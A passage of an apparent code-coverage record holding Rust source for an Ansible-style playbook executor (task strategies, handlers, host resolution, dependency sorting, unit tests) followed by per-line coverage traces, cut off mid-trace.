false,\n            verbosity: 0,\n            strategy: ExecutionStrategy::Linear,\n            task_timeout: 300,\n            gather_facts: true,\n            extra_vars: HashMap::new(),\n        }\n    }\n}\n\n/// Execution strategy determining how tasks are run across hosts\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum ExecutionStrategy {\n    /// Run each task on all hosts before moving to next task\n    Linear,\n    /// Run all tasks on each host as fast as possible\n    Free,\n    /// Pin tasks to specific hosts\n    HostPinned,\n}\n\n/// Statistics collected during execution\n#[derive(Debug, Clone, Default)]\npub struct ExecutionStats {\n    pub ok: usize,\n    pub changed: usize,\n    pub failed: usize,\n    pub skipped: usize,\n    pub unreachable: usize,\n}\n\nimpl ExecutionStats {\n    pub fn merge(\u0026mut self, other: \u0026ExecutionStats) {\n        self.ok += other.ok;\n        self.changed += other.changed;\n        self.failed += other.failed;\n        self.skipped += other.skipped;\n        self.unreachable += other.unreachable;\n    }\n}\n\n/// Host execution result containing stats and state\n#[derive(Debug, Clone)]\npub struct HostResult {\n    pub host: String,\n    pub stats: ExecutionStats,\n    pub failed: bool,\n    pub unreachable: bool,\n}\n\n/// The main executor engine\npub struct Executor {\n    config: ExecutorConfig,\n    runtime: Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n    handlers: Arc\u003cRwLock\u003cHashMap\u003cString, Handler\u003e\u003e\u003e,\n    notified_handlers: Arc\u003cMutex\u003cHashSet\u003cString\u003e\u003e\u003e,\n    semaphore: Arc\u003cSemaphore\u003e,\n}\n\nimpl Executor {\n    /// Create a new executor with the given configuration\n    pub fn new(config: ExecutorConfig) -\u003e Self {\n        let forks = config.forks;\n        Self {\n            config,\n            runtime: Arc::new(RwLock::new(RuntimeContext::new())),\n            handlers: Arc::new(RwLock::new(HashMap::new())),\n            notified_handlers: Arc::new(Mutex::new(HashSet::new())),\n            semaphore: Arc::new(Semaphore::new(forks)),\n        }\n    }\n\n    /// Create executor with a pre-existing runtime context\n    pub fn with_runtime(config: ExecutorConfig, runtime: RuntimeContext) -\u003e Self {\n        let forks = config.forks;\n        Self {\n            config,\n            runtime: Arc::new(RwLock::new(runtime)),\n            handlers: Arc::new(RwLock::new(HashMap::new())),\n            notified_handlers: Arc::new(Mutex::new(HashSet::new())),\n            semaphore: Arc::new(Semaphore::new(forks)),\n        }\n    }\n\n    /// Run a complete playbook\n    #[instrument(skip(self, playbook), fields(playbook_name = %playbook.name))]\n    pub async fn run_playbook(\n        \u0026self,\n        playbook: \u0026Playbook,\n    ) -\u003e ExecutorResult\u003cHashMap\u003cString, HostResult\u003e\u003e {\n        info!(\"Starting playbook: {}\", playbook.name);\n\n        let mut all_results: HashMap\u003cString, HostResult\u003e = HashMap::new();\n\n        // Set playbook-level variables\n        {\n            let mut runtime = self.runtime.write().await;\n            for (key, value) in \u0026playbook.vars {\n                runtime.set_global_var(key.clone(), value.clone());\n            }\n            // Add extra vars (highest precedence)\n            for (key, value) in \u0026self.config.extra_vars {\n                runtime.set_global_var(key.clone(), value.clone());\n            }\n        }\n\n        // Execute each play in sequence\n        for play in \u0026playbook.plays {\n            let play_results = self.run_play(play).await?;\n\n            // Merge results\n            for (host, result) in play_results {\n                all_results\n                    .entry(host)\n                    .and_modify(|existing| {\n                        existing.stats.merge(\u0026result.stats);\n                        existing.failed = existing.failed || result.failed;\n                        existing.unreachable = existing.unreachable || result.unreachable;\n                    })\n                    .or_insert(result);\n            }\n        }\n\n        // Run any remaining notified handlers\n        self.flush_handlers().await?;\n\n        info!(\"Playbook completed: {}\", playbook.name);\n        Ok(all_results)\n    }\n\n    /// Run a single play\n    #[instrument(skip(self, play), fields(play_name = %play.name))]\n    pub async fn run_play(\u0026self, play: \u0026Play) -\u003e ExecutorResult\u003cHashMap\u003cString, HostResult\u003e\u003e {\n        info!(\"Starting play: {}\", play.name);\n\n        // Register handlers for this play\n        {\n            let mut handlers = self.handlers.write().await;\n            for handler in \u0026play.handlers {\n                handlers.insert(handler.name.clone(), handler.clone());\n            }\n        }\n\n        // Set play-level variables\n        {\n            let mut runtime = self.runtime.write().await;\n            for (key, value) in \u0026play.vars {\n                runtime.set_play_var(key.clone(), value.clone());\n            }\n        }\n\n        // Resolve hosts for this play\n        let hosts = self.resolve_hosts(\u0026play.hosts).await?;\n\n        if hosts.is_empty() {\n            warn!(\"No hosts matched for play: {}\", play.name);\n            return Ok(HashMap::new());\n        }\n\n        debug!(\"Executing on {} hosts\", hosts.len());\n\n        // Execute based on strategy\n        let results = match self.config.strategy {\n            ExecutionStrategy::Linear =\u003e self.run_linear(\u0026hosts, \u0026play.tasks).await?,\n            ExecutionStrategy::Free =\u003e self.run_free(\u0026hosts, \u0026play.tasks).await?,\n            ExecutionStrategy::HostPinned =\u003e self.run_host_pinned(\u0026hosts, \u0026play.tasks).await?,\n        };\n\n        // Flush handlers at end of play\n        self.flush_handlers().await?;\n\n        info!(\"Play completed: {}\", play.name);\n        Ok(results)\n    }\n\n    /// Run tasks in linear strategy (all hosts per task before next task)\n    async fn run_linear(\n        \u0026self,\n        hosts: \u0026[String],\n        tasks: \u0026[Task],\n    ) -\u003e ExecutorResult\u003cHashMap\u003cString, HostResult\u003e\u003e {\n        let mut results: HashMap\u003cString, HostResult\u003e = hosts\n            .iter()\n            .map(|h| {\n                (\n                    h.clone(),\n                    HostResult {\n                        host: h.clone(),\n                        stats: ExecutionStats::default(),\n                        failed: false,\n                        unreachable: false,\n                    },\n                )\n            })\n            .collect();\n\n        for task in tasks {\n            // Filter hosts that haven't failed\n            let active_hosts: Vec\u003c_\u003e = hosts\n                .iter()\n                .filter(|h| {\n                    !results\n                        .get(*h)\n                        .map(|r| r.failed || r.unreachable)\n                        .unwrap_or(false)\n                })\n                .cloned()\n                .collect();\n\n            if active_hosts.is_empty() {\n                warn!(\"All hosts have failed, stopping execution\");\n                break;\n            }\n\n            // Run task on all active hosts in parallel (limited by semaphore)\n            let task_results = self.run_task_on_hosts(\u0026active_hosts, task).await?;\n\n            // Update results\n            for (host, task_result) in task_results {\n                if let Some(host_result) = results.get_mut(\u0026host) {\n                    self.update_host_stats(host_result, \u0026task_result);\n                }\n            }\n        }\n\n        Ok(results)\n    }\n\n    /// Run tasks in free strategy (each host runs independently)\n    async fn run_free(\n        \u0026self,\n        hosts: \u0026[String],\n        tasks: \u0026[Task],\n    ) -\u003e ExecutorResult\u003cHashMap\u003cString, HostResult\u003e\u003e {\n        let tasks = Arc::new(tasks.to_vec());\n        let results = Arc::new(Mutex::new(HashMap::new()));\n\n        let handles: Vec\u003c_\u003e = hosts\n            .iter()\n            .map(|host| {\n                let host = host.clone();\n                let tasks = Arc::clone(\u0026tasks);\n                let results = Arc::clone(\u0026results);\n                let semaphore = Arc::clone(\u0026self.semaphore);\n                let runtime = Arc::clone(\u0026self.runtime);\n                let config = self.config.clone();\n                let handlers = Arc::clone(\u0026self.handlers);\n                let notified = Arc::clone(\u0026self.notified_handlers);\n\n                tokio::spawn(async move {\n                    let _permit = semaphore.acquire().await.unwrap();\n\n                    let mut host_result = HostResult {\n                        host: host.clone(),\n                        stats: ExecutionStats::default(),\n                        failed: false,\n                        unreachable: false,\n                    };\n\n                    for task in tasks.iter() {\n                        if host_result.failed || host_result.unreachable {\n                            break;\n                        }\n\n                        let ctx = ExecutionContext::new(host.clone())\n                            .with_check_mode(config.check_mode)\n                            .with_diff_mode(config.diff_mode);\n\n                        let task_result = task.execute(\u0026ctx, \u0026runtime, \u0026handlers, \u0026notified).await;\n\n                        match task_result {\n                            Ok(result) =\u003e {\n                                update_stats(\u0026mut host_result.stats, \u0026result);\n                                if result.status == TaskStatus::Failed {\n                                    host_result.failed = true;\n                                }\n                            }\n                            Err(_) =\u003e {\n                                host_result.failed = true;\n                                host_result.stats.failed += 1;\n                            }\n                        }\n                    }\n\n                    results.lock().await.insert(host, host_result);\n                })\n            })\n            .collect();\n\n        join_all(handles).await;\n\n        let results = Arc::try_unwrap(results)\n            .map_err(|_| ExecutorError::RuntimeError(\"Failed to unwrap results\".into()))?\n            .into_inner();\n\n        Ok(results)\n    }\n\n    /// Run tasks in host_pinned strategy (dedicated worker per host)\n    async fn run_host_pinned(\n        \u0026self,\n        hosts: \u0026[String],\n        tasks: \u0026[Task],\n    ) -\u003e ExecutorResult\u003cHashMap\u003cString, HostResult\u003e\u003e {\n        // For now, host_pinned behaves like free strategy\n        // In a full implementation, this would pin workers to specific hosts\n        self.run_free(hosts, tasks).await\n    }\n\n    /// Run a single task on multiple hosts in parallel\n    async fn run_task_on_hosts(\n        \u0026self,\n        hosts: \u0026[String],\n        task: \u0026Task,\n    ) -\u003e ExecutorResult\u003cHashMap\u003cString, TaskResult\u003e\u003e {\n        debug!(\"Running task '{}' on {} hosts\", task.name, hosts.len());\n\n        let results = Arc::new(Mutex::new(HashMap::new()));\n\n        let handles: Vec\u003c_\u003e = hosts\n            .iter()\n            .map(|host| {\n                let host = host.clone();\n                let task = task.clone();\n                let results = Arc::clone(\u0026results);\n                let semaphore = Arc::clone(\u0026self.semaphore);\n                let runtime = Arc::clone(\u0026self.runtime);\n                let config = self.config.clone();\n                let handlers = Arc::clone(\u0026self.handlers);\n                let notified = Arc::clone(\u0026self.notified_handlers);\n\n                tokio::spawn(async move {\n                    let _permit = semaphore.acquire().await.unwrap();\n\n                    let ctx = ExecutionContext::new(host.clone())\n                        .with_check_mode(config.check_mode)\n                        .with_diff_mode(config.diff_mode);\n\n                    let result = task.execute(\u0026ctx, \u0026runtime, \u0026handlers, \u0026notified).await;\n\n                    match result {\n                        Ok(task_result) =\u003e {\n                            results.lock().await.insert(host, task_result);\n                        }\n                        Err(e) =\u003e {\n                            error!(\"Task failed on host {}: {}\", host, e);\n                            results.lock().await.insert(\n                                host,\n                                TaskResult {\n                                    status: TaskStatus::Failed,\n                                    changed: false,\n                                    msg: Some(e.to_string()),\n                                    result: None,\n                                    diff: None,\n                                },\n                            );\n                        }\n                    }\n                })\n            })\n            .collect();\n\n        join_all(handles).await;\n\n        let results = Arc::try_unwrap(results)\n            .map_err(|_| ExecutorError::RuntimeError(\"Failed to unwrap results\".into()))?\n            .into_inner();\n\n        Ok(results)\n    }\n\n    /// Update host statistics based on task result\n    fn update_host_stats(\u0026self, host_result: \u0026mut HostResult, task_result: \u0026TaskResult) {\n        update_stats(\u0026mut host_result.stats, task_result);\n        if task_result.status == TaskStatus::Failed {\n            host_result.failed = true;\n        } else if task_result.status == TaskStatus::Unreachable {\n            host_result.unreachable = true;\n        }\n    }\n\n    /// Resolve host pattern to list of hosts\n    async fn resolve_hosts(\u0026self, pattern: \u0026str) -\u003e ExecutorResult\u003cVec\u003cString\u003e\u003e {\n        let runtime = self.runtime.read().await;\n\n        // Handle special patterns\n        if pattern == \"all\" {\n            return Ok(runtime.get_all_hosts());\n        }\n\n        if pattern == \"localhost\" {\n            return Ok(vec![\"localhost\".to_string()]);\n        }\n\n        // Check for group name\n        if let Some(hosts) = runtime.get_group_hosts(pattern) {\n            return Ok(hosts);\n        }\n\n        // Check for regex pattern (starts with ~)\n        if let Some(regex_pattern) = pattern.strip_prefix('~') {\n            let re = regex::Regex::new(regex_pattern)\n                .map_err(|e| ExecutorError::ParseError(format!(\"Invalid regex: {}\", e)))?;\n\n            let all_hosts = runtime.get_all_hosts();\n            let matched: Vec\u003c_\u003e = all_hosts.into_iter().filter(|h| re.is_match(h)).collect();\n\n            return Ok(matched);\n        }\n\n        // Treat as single host or comma-separated list\n        let hosts: Vec\u003cString\u003e = pattern.split(',').map(|s| s.trim().to_string()).collect();\n        Ok(hosts)\n    }\n\n    /// Flush all notified handlers\n    async fn flush_handlers(\u0026self) -\u003e ExecutorResult\u003c()\u003e {\n        let notified: Vec\u003cString\u003e = {\n            let mut notified = self.notified_handlers.lock().await;\n            let handlers: Vec\u003c_\u003e = notified.drain().collect();\n            handlers\n        };\n\n        if notified.is_empty() {\n            return Ok(());\n        }\n\n        info!(\"Running {} notified handlers\", notified.len());\n\n        let handlers = self.handlers.read().await;\n\n        for handler_name in notified {\n            if let Some(handler) = handlers.get(\u0026handler_name) {\n                debug!(\"Running handler: {}\", handler_name);\n\n                // Create task from handler\n                let task = Task {\n                    name: handler.name.clone(),\n                    module: handler.module.clone(),\n                    args: handler.args.clone(),\n                    when: handler.when.clone(),\n                    notify: Vec::new(),\n                    register: None,\n                    loop_items: None,\n                    loop_var: \"item\".to_string(),\n                    ignore_errors: false,\n                    changed_when: None,\n                    failed_when: None,\n                    delegate_to: None,\n                    run_once: false,\n                    tags: Vec::new(),\n                    r#become: false,\n                    become_user: None,\n                };\n\n                // Get all active hosts from runtime\n                let hosts = {\n                    let runtime = self.runtime.read().await;\n                    runtime.get_all_hosts()\n                };\n\n                // Run handler on all hosts\n                let _ = self.run_task_on_hosts(\u0026hosts, \u0026task).await?;\n            } else {\n                warn!(\"Handler not found: {}\", handler_name);\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Notify a handler to be run at end of play\n    pub async fn notify_handler(\u0026self, handler_name: \u0026str) {\n        let mut notified = self.notified_handlers.lock().await;\n        notified.insert(handler_name.to_string());\n        debug!(\"Handler notified: {}\", handler_name);\n    }\n\n    /// Check if running in dry-run mode\n    pub fn is_check_mode(\u0026self) -\u003e bool {\n        self.config.check_mode\n    }\n\n    /// Get reference to runtime context\n    pub fn runtime(\u0026self) -\u003e Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e {\n        Arc::clone(\u0026self.runtime)\n    }\n\n    /// Get execution statistics summary\n    pub fn summarize_results(results: \u0026HashMap\u003cString, HostResult\u003e) -\u003e ExecutionStats {\n        let mut summary = ExecutionStats::default();\n        for result in results.values() {\n            summary.merge(\u0026result.stats);\n        }\n        summary\n    }\n}\n\n/// Helper function to update statistics\nfn update_stats(stats: \u0026mut ExecutionStats, result: \u0026TaskResult) {\n    match result.status {\n        TaskStatus::Ok =\u003e {\n            if result.changed {\n                stats.changed += 1;\n            } else {\n                stats.ok += 1;\n            }\n        }\n        TaskStatus::Changed =\u003e stats.changed += 1,\n        TaskStatus::Failed =\u003e stats.failed += 1,\n        TaskStatus::Skipped =\u003e stats.skipped += 1,\n        TaskStatus::Unreachable =\u003e stats.unreachable += 1,\n    }\n}\n\n/// Dependency graph for task ordering\npub struct DependencyGraph {\n    nodes: HashMap\u003cString, Vec\u003cString\u003e\u003e,\n}\n\nimpl DependencyGraph {\n    pub fn new() -\u003e Self {\n        Self {\n            nodes: HashMap::new(),\n        }\n    }\n\n    /// Add a dependency: task depends on dependency\n    pub fn add_dependency(\u0026mut self, task: \u0026str, dependency: \u0026str) {\n        self.nodes\n            .entry(task.to_string())\n            .or_default()\n            .push(dependency.to_string());\n        // Also ensure the dependency exists as a node (with no dependencies of its own)\n        self.nodes.entry(dependency.to_string()).or_default();\n    }\n\n    /// Get topologically sorted task order\n    pub fn topological_sort(\u0026self) -\u003e ExecutorResult\u003cVec\u003cString\u003e\u003e {\n        let mut visited = HashSet::new();\n        let mut temp_visited = HashSet::new();\n        let mut result = Vec::new();\n\n        for node in self.nodes.keys() {\n            if !visited.contains(node) {\n                self.visit(node, \u0026mut visited, \u0026mut temp_visited, \u0026mut result)?;\n            }\n        }\n\n        // Don't reverse - the order is already correct (dependencies come before dependents)\n        Ok(result)\n    }\n\n    fn visit(\n        \u0026self,\n        node: \u0026str,\n        visited: \u0026mut HashSet\u003cString\u003e,\n        temp_visited: \u0026mut HashSet\u003cString\u003e,\n        result: \u0026mut Vec\u003cString\u003e,\n    ) -\u003e ExecutorResult\u003c()\u003e {\n        if temp_visited.contains(node) {\n            return Err(ExecutorError::DependencyCycle(node.to_string()));\n        }\n\n        if !visited.contains(node) {\n            temp_visited.insert(node.to_string());\n\n            if let Some(deps) = self.nodes.get(node) {\n                for dep in deps {\n                    self.visit(dep, visited, temp_visited, result)?;\n                }\n            }\n\n            temp_visited.remove(node);\n            visited.insert(node.to_string());\n            result.push(node.to_string());\n        }\n\n        Ok(())\n    }\n}\n\nimpl Default for DependencyGraph {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n/// Type alias for PlaybookExecutor (same as Executor)\n/// Used for API compatibility and clarity\npub type PlaybookExecutor = Executor;\n\n/// Type alias for TaskExecutor functionality\n/// In a more complex implementation, this could be a separate struct\npub type TaskExecutor = Executor;\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_dependency_graph_no_cycle() {\n        let mut graph = DependencyGraph::new();\n        graph.add_dependency(\"task3\", \"task2\");\n        graph.add_dependency(\"task2\", \"task1\");\n\n        let order = graph.topological_sort().unwrap();\n        // The order should respect dependencies: task1 before task2 before task3\n        assert_eq!(order.len(), 3);\n        let t1_pos = order.iter().position(|x| *x == \"task1\").unwrap();\n        let t2_pos = order.iter().position(|x| *x == \"task2\").unwrap();\n        let t3_pos = order.iter().position(|x| *x == \"task3\").unwrap();\n        assert!(t1_pos \u003c t2_pos, \"task1 should come before task2\");\n        assert!(t2_pos \u003c t3_pos, \"task2 should come before task3\");\n    }\n\n    #[test]\n    fn test_dependency_graph_cycle_detection() {\n        let mut graph = DependencyGraph::new();\n        graph.add_dependency(\"task1\", \"task2\");\n        graph.add_dependency(\"task2\", \"task3\");\n        graph.add_dependency(\"task3\", \"task1\");\n\n        let result = graph.topological_sort();\n        assert!(matches!(result, Err(ExecutorError::DependencyCycle(_))));\n    }\n\n    #[test]\n    fn test_execution_stats_merge() {\n        let mut stats1 = ExecutionStats {\n            ok: 1,\n            changed: 2,\n            failed: 0,\n            skipped: 1,\n            unreachable: 0,\n        };\n\n        let stats2 = ExecutionStats {\n            ok: 2,\n            changed: 1,\n            failed: 1,\n            skipped: 0,\n            unreachable: 1,\n        };\n\n        stats1.merge(\u0026stats2);\n\n        assert_eq!(stats1.ok, 3);\n        assert_eq!(stats1.changed, 3);\n        assert_eq!(stats1.failed, 1);\n        assert_eq!(stats1.skipped, 1);\n        assert_eq!(stats1.unreachable, 1);\n    }\n}\n","traces":[{"line":85,"address":[25323520],"length":1,"stats":{"Line":0}},{"line":94,"address":[25323534],"length":1,"stats":{"Line":0}},{"line":121,"address":[25324160],"length":1,"stats":{"Line":1}},{"line":122,"address":[25324250,25324184],"length":1,"stats":{"Line":1}},{"line":123,"address":[25324308,25324224,25324278],"length":1,"stats":{"Line":2}},{"line":124,"address":[25324366,25324336,25324282],"length":1,"stats":{"Line":2}},{"line":125,"address":[25324394,25324423,25324340],"length":1,"stats":{"Line":2}},{"line":126,"address":[25324454,25324445,25324398],"length":1,"stats":{"Line":2}},{"line":150,"address":[25327744,25328357],"length":1,"stats":{"Line":0}},{"line":151,"address":[25327761],"length":1,"stats":{"Line":0}},{"line":154,"address":[25327877,25327833],"length":1,"stats":{"Line":0}},{"line":155,"address":[25327948,25327995],"length":1,"stats":{"Line":0}},{"line":156,"address":[25328058,25328117],"length":1,"stats":{"Line":0}},{"line":157,"address":[25328185,25328259],"length":1,"stats":{"Line":0}},{"line":162,"address":[25326480,25327078],"length":1,"stats":{"Line":0}},{"line":163,"address":[25326510],"length":1,"stats":{"Line":0}},{"line":166,"address":[25326574,25326641],"length":1,"stats":{"Line":0}},{"line":167,"address":[25326674,25326718],"length":1,"stats":{"Line":0}},{"line":168,"address":[25326781,25326840],"length":1,"stats":{"Line":0}},{"line":169,"address":[25326908,25326982],"length":1,"stats":{"Line":0}},{"line":175,"address":[25326448],"length":1,"stats":{"Line":0}},{"line":179,"address":[32601700,32601870,32602157],"length":1,"stats":{"Line":0}},{"line":181,"address":[32602143],"length":1,"stats":{"Line":0}},{"line":185,"address":[26025199],"length":1,"stats":{"Line":0}},{"line":186,"address":[32602944,32602858,32603830],"length":1,"stats":{"Line":0}},{"line":187,"address":[32603110,32603835,32603683,32603749,32603664],"length":1,"stats":{"Line":0}},{"line":190,"address":[32603136,32603623],"length":1,"stats":{"Line":0}},{"line":191,"address":[32603337,32603545,32603463,32603628,32603482],"length":1,"stats":{"Line":0}},{"line":196,"address":[32604763,32603372],"length":1,"stats":{"Line":0}},{"line":197,"address":[26025214],"length":1,"stats":{"Line":0}},{"line":200,"address":[32604335,32604455,32605259,32604541],"length":1,"stats":{"Line":0}},{"line":201,"address":[32604710],"length":1,"stats":{"Line":0}},{"line":202,"address":[32604730],"length":1,"stats":{"Line":0}},{"line":203,"address":[32606400,32605061],"length":1,"stats":{"Line":0}},{"line":204,"address":[32606430],"length":1,"stats":{"Line":0}},{"line":205,"address":[32606447],"length":1,"stats":{"Line":0}},{"line":206,"address":[32606492],"length":1,"stats":{"Line":0}},{"line":208,"address":[32605140],"length":1,"stats":{"Line":0}},{"line":213,"address":[26025229],"length":1,"stats":{"Line":0}},{"line":215,"address":[32605963,32605650],"length":1,"stats":{"Line":0}},{"line":216,"address":[32605910],"length":1,"stats":{"Line":0}},{"line":221,"address":[25328464,25328477],"length":1,"stats":{"Line":0}},{"line":222,"address":[32633156,32633410,32633709],"length":1,"stats":{"Line":0}},{"line":226,"address":[32633990,32633217,32634111,32633683],"length":1,"stats":{"Line":0}},{"line":227,"address":[32634432,32634343],"length":1,"stats":{"Line":0}},{"line":228,"address":[32634743,32634550,32634724,32634809],"length":1,"stats":{"Line":0}},{"line":234,"address":[32634952,32634591,32633238],"length":1,"stats":{"Line":0}},{"line":235,"address":[32635815,32635184,32635270],"length":1,"stats":{"Line":0}},{"line":236,"address":[32635734,32635668,32635436,32635649,32635820],"length":1,"stats":{"Line":0}},{"line":241,"address":[32633259,32638334,32635477,32635850],"length":1,"stats":{"Line":0}},{"line":243,"address":[32636299,32636226],"length":1,"stats":{"Line":0}},{"line":244,"address":[32638032,32637791,32636333],"length":1,"stats":{"Line":0}},{"line":245,"address":[32638022,32638285],"length":1,"stats":{"Line":0}},{"line":248,"address":[32636305,32636371,32636696],"length":1,"stats":{"Line":0}},{"line":251,"address":[32636644],"length":1,"stats":{"Line":0}},{"line":252,"address":[26005546],"length":1,"stats":{"Line":0}},{"line":253,"address":[26005565],"length":1,"stats":{"Line":0}},{"line":254,"address":[26005584],"length":1,"stats":{"Line":0}},{"line":258,"address":[26005603],"length":1,"stats":{"Line":0}},{"line":260,"address":[32640008,32640370],"length":1,"stats":{"Line":0}},{"line":261,"address":[32640268],"length":1,"stats":{"Line":0}},{"line":265,"address":[25326384],"length":1,"stats":{"Line":0}},{"line":270,"address":[32596567,32596758],"length":1,"stats":{"Line":0}},{"line":272,"address":[32599513,32599184,32596711,32599519],"length":1,"stats":{"Line":0}},{"line":274,"address":[32599230],"length":1,"stats":{"Line":0}},{"line":275,"address":[32599368],"length":1,"stats":{"Line":0}},{"line":276,"address":[32599267],"length":1,"stats":{"Line":0}},{"line":277,"address":[32599320],"length":1,"stats":{"Line":0}},{"line":285,"address":[32596892,32596876,32597827,32596785],"length":1,"stats":{"Line":0}},{"line":287,"address":[32597895,32598053],"length":1,"stats":{"Line":0}},{"line":289,"address":[32599120,32598003],"length":1,"stats":{"Line":0}},{"line":290,"address":[32599134,32599164],"length":1,"stats":{"Line":0}},{"line":291,"address":[32599137],"length":1,"stats":{"Line":0}},{"line":292,"address":[32599584,32599594,32599148],"length":1,"stats":{"Line":0}},{"line":293,"address":[32599153],"length":1,"stats":{"Line":0}},{"line":298,"address":[32598080,32598151],"length":1,"stats":{"Line":0}},{"line":299,"address":[32598199,32598324,32598573],"length":1,"stats":{"Line":0}},{"line":304,"address":[32596948,32596975,32597223,32596632,32598165,32598252],"length":1,"stats":{"Line":0}},{"line":307,"address":[32597550,32597636,32597430],"length":1,"stats":{"Line":0}},{"line":308,"address":[32598876,32597743],"length":1,"stats":{"Line":0}},{"line":309,"address":[32598939,32598973],"length":1,"stats":{"Line":0}},{"line":314,"address":[32597932],"length":1,"stats":{"Line":0}},{"line":318,"address":[25328400],"length":1,"stats":{"Line":0}},{"line":323,"address":[32625236,32625140],"length":1,"stats":{"Line":0}},{"line":324,"address":[32625283,32625338],"length":1,"stats":{"Line":0}},{"line":328,"address":[32625523,32627434,32627364,32626416],"length":1,"stats":{"Line":0}},{"line":329,"address":[32626444],"length":1,"stats":{"Line":0}},{"line":330,"address":[32626585,32626519],"length":1,"stats":{"Line":0}},{"line":331,"address":[32626598,32626662],"length":1,"stats":{"Line":0}},{"line":332,"address":[32626675,32626747],"length":1,"stats":{"Line":0}},{"line":333,"address":[32626760,32626824],"length":1,"stats":{"Line":0}},{"line":334,"address":[32626837],"length":1,"stats":{"Line":0}},{"line":335,"address":[32626903,32626970],"length":1,"stats":{"Line":0}},{"line":336,"address":[32626986,32627049],"length":1,"stats":{"Line":0}},{"line":338,"address":[32627057,32627675,32627814,32627632,32628804,32630853,32628017,32627835,32627771],"length":1,"stats":{"Line":0}},{"line":339,"address":[32627724,32627801,32627912,32628051],"length":1,"stats":{"Line":0}},{"line":341,"address":[32628485],"length":1,"stats":{"Line":0}},{"line":342,"address":[32628347],"length":1,"stats":{"Line":0}},{"line":343,"address":[32628429],"length":1,"stats":{"Line":0}},{"line":348,"address":[32628572,32628647,32629569,32628782],"length":1,"stats":{"Line":0}},{"line":349,"address":[32629637,32629681],"length":1,"stats":{"Line":0}},{"line":353,"address":[32629698,32629793],"length":1,"stats":{"Line":0}},{"line":354,"address":[32629748],"length":1,"stats":{"Line":0}},{"line":355,"address":[32629786,32629808],"length":1,"stats":{"Line":0}},{"line":357,"address":[26074905],"length":1,"stats":{"Line":0}},{"line":359,"address":[32629128],"length":1,"stats":{"Line":0}},{"line":360,"address":[32629246],"length":1,"stats":{"Line":0}},{"line":361,"address":[32629261],"length":1,"stats":{"Line":0}},{"line":362,"address":[32629309,32629375],"length":1,"stats":{"Line":0}},{"line":363,"address":[32629368],"length":1,"stats":{"Line":0}},{"line":366,"address":[32629502],"length":1,"stats":{"Line":0}},{"line":367,"address":[32629173],"length":1,"stats":{"Line":0}},{"line":368,"address":[32629495,32629504,32629180],"length":1,"stats":{"Line":0}},{"line":373,"address":[26074927],"length":1,"stats":{"Line":0}},{"line":378,"address":[26282695],"length":1,"stats":{"Line":0}},{"line":380,"address":[32626027,32625962,32626080],"length":1,"stats":{"Line":0}},{"line":381,"address":[32627472,32626048,32627490,32626004],"length":1,"stats":{"Line":0}},{"line":384,"address":[32626237],"length":1,"stats":{"Line":0}},{"line":388,"address":[25327248],"length":1,"stats":{"Line":0}},{"line":395,"address":[26291191],"length":1,"stats":{"Line":0}},{"line":399,"address":[25327312],"length":1,"stats":{"Line":0}},{"line":404,"address":[32617636,32617514,32617877],"length":1,"stats":{"Line":0}},{"line":406,"address":[32617867,32618234],"length":1,"stats":{"Line":0}},{"line":410,"address":[32620430,32619376,32618436,32620351],"length":1,"stats":{"Line":0}},{"line":411,"address":[32619404],"length":1,"stats":{"Line":0}},{"line":412,"address":[32619540,32619479],"length":1,"stats":{"Line":0}},{"line":413,"address":[32619612,32619548],"length":1,"stats":{"Line":0}},{"line":414,"address":[32619628,32619700],"length":1,"stats":{"Line":0}},{"line":415,"address":[32619716,32619780],"length":1,"stats":{"Line":0}},{"line":416,"address":[32619796],"length":1,"stats":{"Line":0}},{"line":417,"address":[32619862,32619929],"length":1,"stats":{"Line":0}},{"line":418,"address":[32619945,32620008],"length":1,"stats":{"Line":0}},{"line":420,"address":[32620016,32620624,32620841,32620820,32621747,32620862,32621047,32624660,32620670,32620777],"length":1,"stats":{"Line":0}},{"line":421,"address":[32620942,32621081,32620719,32620807],"length":1,"stats":{"Line":0}},{"line":423,"address":[32621525,32621379,32621465],"length":1,"stats":{"Line":0}},{"line":424,"address":[32621480],"length":1,"stats":{"Line":0}},{"line":425,"address":[32621518,32621540],"length":1,"stats":{"Line":0}},{"line":427,"address":[26089068],"length":1,"stats":{"Line":0}},{"line":429,"address":[32622033],"length":1,"stats":{"Line":0}},{"line":430,"address":[32622144],"length":1,"stats":{"Line":0}},{"line":431,"address":[26089090],"length":1,"stats":{"Line":0}},{"line":433,"address":[32622077],"length":1,"stats":{"Line":0}},{"line":434,"address":[32622670,32622105,32622417],"length":1,"stats":{"Line":0}},{"line":435,"address":[26089112],"length":1,"stats":{"Line":0}},{"line":436,"address":[32623835],"length":1,"stats":{"Line":0}},{"line":437,"address":[32623998],"length":1,"stats":{"Line":0}},{"line":440,"address":[32623873,32623940],"length":1,"stats":{"Line":0}},{"line":441,"address":[32623972],"length":1,"stats":{"Line":0}},{"line":442,"address":[32623990],"length":1,"stats":{"Line":0}},{"line":451,"address":[32618526,32618643,32617569],"length":1,"stats":{"Line":0}},{"line":453,"address":[32618960,32619013,32618895],"length":1,"stats":{"Line":0}},{"line":454,"address":[32618981,32620464,32620482,32618937],"length":1,"stats":{"Line":0}},{"line":457,"address":[32619165],"length":1,"stats":{"Line":0}},{"line":461,"address":[25327584],"length":1,"stats":{"Line":0}},{"line":462,"address":[25327637],"length":1,"stats":{"Line":0}},{"line":463,"address":[25327651],"length":1,"stats":{"Line":0}},{"line":464,"address":[25327709],"length":1,"stats":{"Line":0}},{"line":465,"address":[25327727,25327679],"length":1,"stats":{"Line":0}},{"line":466,"address":[25327723],"length":1,"stats":{"Line":0}},{"line":471,"address":[25327120,25327138],"length":1,"stats":{"Line":0}},{"line":472,"address":[26287815],"length":1,"stats":{"Line":0}},{"line":475,"address":[32607105,32607175],"length":1,"stats":{"Line":0}},{"line":476,"address":[32608600,32607220],"length":1,"stats":{"Line":0}},{"line":479,"address":[32607186,32607239],"length":1,"stats":{"Line":0}},{"line":480,"address":[32607275,32608293],"length":1,"stats":{"Line":0}},{"line":484,"address":[32607253,32607300],"length":1,"stats":{"Line":0}},{"line":485,"address":[32607408],"length":1,"stats":{"Line":0}},{"line":489,"address":[32607475,32607537],"length":1,"stats":{"Line":0}},{"line":490,"address":[32608101,32607714,32607616,32607767],"length":1,"stats":{"Line":0}},{"line